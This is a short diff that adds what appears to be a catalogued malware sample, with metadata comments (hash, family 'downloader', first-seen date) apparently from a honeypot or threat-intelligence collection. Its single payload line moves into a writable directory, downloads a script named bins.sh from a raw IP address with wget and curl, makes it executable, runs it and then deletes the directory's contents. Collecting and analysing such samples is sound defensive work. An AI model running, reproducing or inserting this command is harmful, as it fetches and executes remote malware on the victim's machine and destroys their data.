@@ -1,0 +1,10 @@
+# sha256: ad099469ec6ac1fa0859ceaf4e3cfe922a9bd870335a3ec23b2d4bbade2b6f77
+# family: downloader
+# kind: script
+# size_bytes: 167
+# first_seen: 2026-07-30 02:27:06.781242 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.56.209.153/bins.sh; curl -O http://31.56.209.153/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf *
